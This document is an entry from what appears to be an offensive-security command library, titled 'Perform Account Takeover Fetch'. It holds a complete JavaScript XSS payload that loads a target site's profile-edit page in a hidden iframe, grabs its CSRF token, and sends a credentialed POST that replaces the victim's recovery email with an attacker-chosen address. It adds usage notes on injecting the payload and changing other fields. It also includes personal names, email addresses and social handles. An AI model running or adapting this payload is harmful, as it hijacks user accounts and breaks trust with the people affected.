---
id: cmd-perform-account-takeover-fetch
data: >-
  document.body.innerHTML="<iframe id=ifr
  src=https://www.twitterflightschool.com/widgets/twitter_registrations/edit></iframe>";

  var point=0;

  csrf=setInterval(function(){
   try{
   var csrf_token = ifr.contentDocument.getElementsByName('authenticity_token')[0].value;
   if(csrf_token){
   console.log("[OK] CSRF TOKEN => "+encodeURIComponent(csrf_token))
   ifr.contentWindow.fetch("https://www.twitterflightschool.com/widgets/twitter_registrations", {
   "credentials": "include",
   "headers": {
   "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0",
   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
   "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3",
   "Content-Type": "application/x-www-form-urlencoded",
   "Upgrade-Insecure-Requests": "1"
   },
   "referrer": "https://www.twitterflightschool.com/widgets/twitter_registrations/edit",
   "body": "utf8=%E2%9C%93&_method=put&authenticity_token="+encodeURIComponent(csrf_token)+"&user%5Bpicture_attributes%5D%5Btarget%5D=https%3A%2F%2Fcdn.exceedlms.com%2Fuploads%2Fresource_user_pictures%2Ftargets%2F1386869%2Foriginal%2F3cimg-src-3dx-3e.jpeg%3FPolicy%3DeyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9jZG4uZXhjZWVkbG1zLmNvbS91cGxvYWRzL3Jlc291cmNlX3VzZXJfcGljdHVyZXMvdGFyZ2V0cy8xMzg2ODY5L29yaWdpbmFsLzNjaW1nLXNyYy0zZHgtM2UuanBlZyIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTU4ODg5MjA0Nn19fV19%26Signature%3DUOaxR9eCgoEFhlzyy-6VtVqgj0oj%7E9LgIkeLIyUq4n2h8daR%7EsEsd1ghoJW1P369cHPTBus41bvLB8Vrob9ITkUVib0PIraTwZSv%7Eei51-TV9UpqQRVR51zC3-z62sqQtoXXsDa85vn%7EfEC%7E6uiLtx0VyZ3vECr8GxAG9sVuW7T2UYgeL00yTEtDhyd9mAPFq2%7E5A2lxzNrIzGCQPzlS4hk1RFW8lNcOAL2i2MzusqY8neX-l5QTh%7ECH6gEG73bnvDQZOvHyLF42WprG7kgyAzWHO3M9fI3FXxeYo-T1f2eAp-ggOf%7EVdcZqJiUHM6iUvmDbyQRe5kcAsblfjjU-Bg__%26Key-Pair-Id%3DAPKAJINUZDMKZJI5I6DA&user%5Bpicture_attributes%5D%5Bid%5D=1386869&login_to=&user%5Bemail%5D=guilhermeassmannn%40gmail.com&user%5Bcustom_a%5D=keerok%40protonmail.com&user%5Bfirst_name%5D=Guilherme&user%5Blast_name%5D=Assmann&user%5Bcountry_code%5D=BR&user%5Btzid%5D=Brasilia&user%5Blocale%5D=en-GB&user%5Bcustom_b%5D=Other&user%5Bcustom_c%5D=&custom_c_key_select=&custom_c_value_select=&custom_c_other_key=&custom_c_other=&user%5Bcustom_d%5D=&custom_d_key_select=&custom_d_other=&user%5Bcustom_h%5D=pentestz&user%5Bcustom_n%5D=&user%5Bcustom_o%5D=&user%5Btwitter_handle%5D=k33r0k&user%5Bcustom_r%5D=k33r0k&user%5Bcustom_s%5D=New+on+platform%3A+never+advertised+and+would+like+to+start&user%5Bcustom_t%5D=Yes&user%5Bcustom_q%5D=Yes&commit=Save",
   "method": "POST",
   "mode": "cors"
  }).then(function(x){
   console.log("[OK] REQUEST");
   console.log(x.status);
   clearInterval(csrf);
   });
   }
   }catch(e){
   console.log("not yet");
   }
  },1337)
tags:
  - account-takeover
  - fetch
type: command
output: 'Console logs: ''[OK] CSRF TOKEN => [token]'' and ''[OK] REQUEST'' with status code'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:03.453Z'
verified: false
validated: true
submitted: true
---
# Perform Account Takeover Fetch

## Command

```javascript
document.body.innerHTML="<iframe id=ifr src=https://www.twitterflightschool.com/widgets/twitter_registrations/edit></iframe>";
var point=0;
csrf=setInterval(function(){
 try{
 var csrf_token = ifr.contentDocument.getElementsByName('authenticity_token')[0].value;
 if(csrf_token){
 console.log("[OK] CSRF TOKEN => "+encodeURIComponent(csrf_token))
 ifr.contentWindow.fetch("https://www.twitterflightschool.com/widgets/twitter_registrations", {
 "credentials": "include",
 "headers": {
 "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0",
 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
 "Accept-Language": "pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3",
 "Content-Type": "application/x-www-form-urlencoded",
 "Upgrade-Insecure-Requests": "1"
 },
 "referrer": "https://www.twitterflightschool.com/widgets/twitter_registrations/edit",
 "body": "utf8=%E2%9C%93&_method=put&authenticity_token="+encodeURIComponent(csrf_token)+"&user%5Bpicture_attributes%5D%5Btarget%5D=https%3A%2F%2Fcdn.exceedlms.com%2Fuploads%2Fresource_user_pictures%2Ftargets%2F1386869%2Foriginal%2F3cimg-src-3dx-3e.jpeg%3FPolicy%3DeyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9jZG4uZXhjZWVkbG1zLmNvbS91cGxvYWRzL3Jlc291cmNlX3VzZXJfcGljdHVyZXMvdGFyZ2V0cy8xMzg2ODY5L29yaWdpbmFsLzNjaW1nLXNyYy0zZHgtM2UuanBlZyIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTU4ODg5MjA0Nn19fV19%26Signature%3DUOaxR9eCgoEFhlzyy-6VtVqgj0oj%7E9LgIkeLIyUq4n2h8daR%7EsEsd1ghoJW1P369cHPTBus41bvLB8Vrob9ITkUVib0PIraTwZSv%7Eei51-TV9UpqQRVR51zC3-z62sqQtoXXsDa85vn%7EfEC%7E6uiLtx0VyZ3vECr8GxAG9sVuW7T2UYgeL00yTEtDhyd9mAPFq2%7E5A2lxzNrIzGCQPzlS4hk1RFW8lNcOAL2i2MzusqY8neX-l5QTh%7ECH6gEG73bnvDQZOvHyLF42WprG7kgyAzWHO3M9fI3FXxeYo-T1f2eAp-ggOf%7EVdcZqJiUHM6iUvmDbyQRe5kcAsblfjjU-Bg__%26Key-Pair-Id%3DAPKAJINUZDMKZJI5I6DA&user%5Bpicture_attributes%5D%5Bid%5D=1386869&login_to=&user%5Bemail%5D=guilhermeassmannn%40gmail.com&user%5Bcustom_a%5D=keerok%40protonmail.com&user%5Bfirst_name%5D=Guilherme&user%5Blast_name%5D=Assmann&user%5Bcountry_code%5D=BR&user%5Btzid%5D=Brasilia&user%5Blocale%5D=en-GB&user%5Bcustom_b%5D=Other&user%5Bcustom_c%5D=&custom_c_key_select=&custom_c_value_select=&custom_c_other_key=&custom_c_other=&user%5Bcustom_d%5D=&custom_d_key_select=&custom_d_other=&user%5Bcustom_h%5D=pentestz&user%5Bcustom_n%5D=&user%5Bcustom_o%5D=&user%5Btwitter_handle%5D=k33r0k&user%5Bcustom_r%5D=k33r0k&user%5Bcustom_s%5D=New+on+platform%3A+never+advertised+and+would+like+to+start&user%5Bcustom_t%5D=Yes&user%5Bcustom_q%5D=Yes&commit=Save",
 "method": "POST",
 "mode": "cors"
}).then(function(x){
 console.log("[OK] REQUEST");
 console.log(x.status);
 clearInterval(csrf);
 });
 }
 }catch(e){
 console.log("not yet");
 }
},1337)
```

## Description

This JavaScript command sets up an iframe, polls for the CSRF token at intervals, and uses it in a fetch POST to update user data, specifically the recovery email, for account takeover.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | Full URL for iframe (edit page) | Yes |
| setInterval delay | Polling interval in ms (1337) | Yes |
| fetch URL | Endpoint for POST (/widgets/twitter_registrations) | Yes |
| body | Encoded form data with token and new email | Yes |
| credentials | Include cookies for session | Yes |

## Examples

### Basic Usage

Inject the full script via XSS console or payload.

### Advanced Usage

Modify body to change other fields, e.g., adjust user[custom_a] to different email.

## Expected Output

Console: "[OK] CSRF TOKEN => [encoded_token]" followed by "[OK] REQUEST" and status (e.g., 200).

## Related

- [[Related Procedure: Update-Recovery-Email-for-Account-Takeover]]
